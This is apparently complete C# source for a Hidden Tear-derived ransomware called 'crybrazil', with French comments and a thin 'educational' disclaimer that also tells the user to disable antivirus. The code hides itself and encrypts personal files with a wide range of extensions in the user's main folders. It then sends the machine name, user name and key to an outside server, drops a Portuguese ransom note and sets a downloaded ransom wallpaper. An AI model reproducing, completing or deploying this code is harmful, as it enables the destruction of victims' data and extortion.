﻿/*
                 
 * Desactiver l'antivirus  ou windows defender avant de compiler
 * ce ransomware est abus educative,il doit etre utliser sur une machine virtuelle
 * je ne suis pas responsable de vos actes,vous pouriez y'aller en prison si vous utlisez ce programme à des fins illegal.
 */

using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading;


namespace hidden_tear
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
        //Url Envoyer un mot de passe de cryptage et des infos de l'ordinateur au serveur,cette ligne sera ignoré
        string targetURL = "http://3e24c23r2213122c1cxdsxsd.unaux.com/crybrazil/write.php?info="; //url en cas de besoin pour envoyer le mot de passe au serveur mais vous pouvez laisser tomber
        string userName = Environment.UserName;
        string computerName = System.Environment.MachineName.ToString();
        string userDir = "C:\\";
        string backgroundImageUrl = "http://4.bp.blogspot.com/-11m8rWaFmWs/WuhochGTK0I/AAAAAAAAFTY/VkbbVhxYZDgW_jlbQ5lPbV8AEhyd4ihgQCK4BGAYYCw/s1600/ranso4.jpg"; //image de fond de l'ecran après le cryptage des fichiers,heberger une photo dans votre serveur,cette photo ne fonctionnera pas



        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Opacity = 0;
            this.ShowInTaskbar = false;
            //starts encryption at form load
            startAction();

        }

        //hide process also from taskmanager
        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;  // Turn on WS_EX_TOOLWINDOW
                return cp;
            }
        }

        private void Form_Shown(object sender, EventArgs e)
        {
            Visible = false;
            Opacity = 100;
        }

        //AES encryption algorithm
        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        //creation du mot de passe aleatoir du cryptage
        public string CreatePassword(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()"; // format du mot de passe mais cette ligne n'a pas d'importance
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--) {
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
        }

        //Envoie du mot de passe de la cible au serveur,on a personnaliser le mot de passe 
        public void SendPassword(string password) {

            try
            {
                string info = computerName + "-" + userName + " " + password;
                var fullUrl = targetURL + info;
                var conent = new System.Net.WebClient().DownloadString(fullUrl);
            }
            catch (Exception)
            {
                
            }
        }

        //cytper les fichiers
        public void EncryptFile(string file, string password)
        {

            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            // Hash the password with SHA256
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

            string users = "Users\\";
            string path_inf = users + userName + "\\Desktop\\SUA_CHAVE.html.hacked";   //path 
            string fullpath_inf = userDir + path_inf;
            if (File.Exists(fullpath_inf))
            {
                File.Delete(fullpath_inf);
            }
            File.WriteAllBytes(file, bytesEncrypted);
            System.IO.File.Move(file, file + ".crybrazil");    //exstension des fichiers pour prouver que tout est crypté.hacked
        }

        //crypter le repertoire
        public void encryptDirectory(string location, string password)
        {
            try
            {
                //extensions qui seront crypté, n'ajouter pas .ini sinon le virus se bloque avant de crypter les fichiers
                var validExtensions = new[]
                {
                     ".dat", ".keychain", ".sdf", ".vcf", ".jpg", ".png", ".tiff", ".tif", ".gif", ".jpeg", ".jif", ".jfif", ".jp2", ".jpx", ".j2k", ".j2c", ".fpx", ".pcd", ".bmp",
                     ".svg", ".3dm", ".3ds", ".max", ".obj", ".dds", ".psd", ".tga", ".thm", ".yuv", ".ai", ".eps", ".ps", ".indd", ".pct", ".mp4", ".avi", ".mkv", ".3g2", ".3gp", 
                     ".asf", ".flv", ".m4v", ".mov", ".mpg", ".rm", ".srt", ".swf", ".vob", ".wmv", ".doc", ".docx", ".txt", ".pdf", ".log", ".msg", ".odt", ".pages", ".rtf", ".tex", 
                     ".wpd", ".wps", ".csv", ".ged", ".key", ".pps", ".ppt", ".pptx", ".xml", ".json", ".xlsx", ".xlsm", ".xlsb", ".xls", ".mht", ".mhtml", ".htm", ".html", ".xltx", 
                     ".prn", ".dif", ".slk", ".xlam", ".xla", ".ods", ".docm", ".dotx", ".dotm", ".xps", ".ics", ".mp3", ".aif", ".iff", ".m3u", ".m4a", ".mid", ".mpa", ".wav", ".wma", 
                     ".msi", ".php", ".apk", ".app", ".bat", ".cgi", ".com", ".asp", ".aspx", ".cer", ".cfm", ".css", ".js", ".jsp", ".rss", ".xhtml", ".c", ".class", ".cpp", ".cs", ".h", 
                     ".java", ".lua", ".pl", ".py", ".sh", ".sln", ".swift", ".vb", ".vcxproj", ".dem", ".gam", ".nes", ".rom", ".sav", ".tgz", ".zip", ".rar", ".tar", ".7z", ".cbr", ".deb", 
                     ".gz", ".pkg", ".rpm", ".zipx", ".iso", ".accdb", ".db", ".dbf", ".mdb", ".sql", ".fnt", ".fon", ".otf", ".ttf", ".cfg", ".prf", ".bak", ".old", ".tmp", ".torrent",
                     ".der", ".pfx", ".crt", ".csr", ".p12", ".pem", ".ott", ".sxw", ".stw", ".uot", ".ots", ".sxc", ".stc", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm",
                     ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".suo", ".pas", ".asm", ".cmd", ".ps1", ".vbs", ".dip", ".dch",
                     ".sch", ".brd", ".rb", ".jar", ".fla", ".mpeg", ".m4u", ".djvu", ".nef", ".cgm", ".raw", ".vcd", ".backup", ".tbk", ".bz2", ".PAQ", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm",
                     ".sldx", ".sti", ".sxi", ".602", ".hwp", ".edb", ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pot", ".pptm", ".xltm", ".xlc", ".xlm", ".xlt", ".xlw", ".dot", ".docb", ".snt", ".onetoc2",
                     ".dwg", ".wk1", ".wks", ".123", ".vsdx", ".vsd", ".eml", ".ost", ".pst"
            
                };

                string[] files = Directory.GetFiles(location);
                string[] childDirectories = Directory.GetDirectories(location);
                for (int i = 0; i < files.Length; i++)
                {
                    string extension = Path.GetExtension(files[i]);
                    if (validExtensions.Contains(extension))
                    {
                        EncryptFile(files[i], password);
                    }
                }
                for (int i = 0; i < childDirectories.Length; i++)
                {
                    encryptDirectory(childDirectories[i], password);
                }
            } catch (Exception)
            {

            }
        }

        //create a random dir and move virus on it to avoid conflicts with encryption itself
        public void MoveVirus()
        {
            string destFileName = userDir + userName + "\\Rand123";
            string destFileName_2 = userDir + userName + "\\Rand123\\local.exe";
            if (!Directory.Exists(destFileName))
            {
                Directory.CreateDirectory(destFileName);
            }
            else
            {
                if (File.Exists(destFileName_2))
                {
                    File.Delete(destFileName_2);
                }
            }
            string name = "\\" + Process.GetCurrentProcess().ProcessName + ".exe";
            string curFile = Directory.GetCurrentDirectory() + name;
            string sourceFileName = curFile;
            File.Move(sourceFileName, destFileName_2);

        }

        //check for internet connection
        public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                {
                    using (var stream = client.OpenRead("https://www.google.fr"))
                    {
                        return true;
                    }
                }
            }
            catch
            {
                return false;
            }
        }

        public void startAction()
        {
            string password = "AA151257B1462D642E7E21FF9C80F83CAF043C3572D5ED59BD283D20641E3C9D";   //mot de passe par defaut
            MoveVirus();
            Directory_Settings_Sending(password);
            messageCreator();
            bool Internet;
            string backgroundImageName = userDir + userName + "\\ranso4.jpg";
            // creation d'une boucle si la connexion n'existe pas et puis si la connexion revient,l'image de fond va changé et pour envoyer le mot de passe au serveur
            do
            {
                Internet = CheckForInternetConnection();
                if (Internet == true)
                {
                    SetWallpaperFromWeb(backgroundImageUrl, backgroundImageName);
                    SendPassword(password);
                }
            } while (Internet == false) ;
            password = null;
            System.Windows.Forms.Application.Exit();
        }

        public void Directory_Settings_Sending(string password){
            //chemin pour crypter les fichiers qui se trouvent dans les dossiers.
            string path_1 = "Users\\";
            string startPath_1 = userDir + path_1 + userName + "\\Desktop";
            string startPath_5 = userDir + path_1 + userName + "\\Documents";
            string startPath_6 = userDir + path_1 + userName + "\\Downloads";
            string startPath_7 = userDir + path_1 + userName + "\\Pictures";
            string startPath_8 = userDir + path_1 + userName + "\\Music";
            string startPath_13 = userDir + path_1 + userName + "\\Videos";
            encryptDirectory(startPath_1, password);
            encryptDirectory(startPath_5, password);
            encryptDirectory(startPath_6, password);
            encryptDirectory(startPath_7, password);
            encryptDirectory(startPath_8, password);
            encryptDirectory(startPath_13, password);
        }
        //creation du message qui sera vu par le proprietaire de l'ordinateur
        public void messageCreator()
        {
            string path = "\\Desktop\\SUA_CHAVE.html";
            string fullpath = userDir + "Users\\" + userName + path;
            string infos = computerName + "-" + userName;
            string[] lines = { "<a href= 'http://3e24c23r2213122c1cxdsxsd.unaux.com' target='_blank'<H3>O QUE ESTÁ ACONTECENDO?</H3></a>"};
            System.IO.File.WriteAllLines(fullpath, lines);

        }

        //modication de l'image du bureau
        public void SetWallpaper(String path)
        {
            SystemParametersInfo(0x14, 0, path, 0x01 | 0x02);
        }

        //telechargement de l'image du bureau depuis internet
        private void SetWallpaperFromWeb(string url, string path)
        {
            try
            {
                WebClient webClient = new WebClient();
                webClient.DownloadFile(new Uri(url), path);
                SetWallpaper(path);
            }
            catch (Exception){ }
        }
    }
}
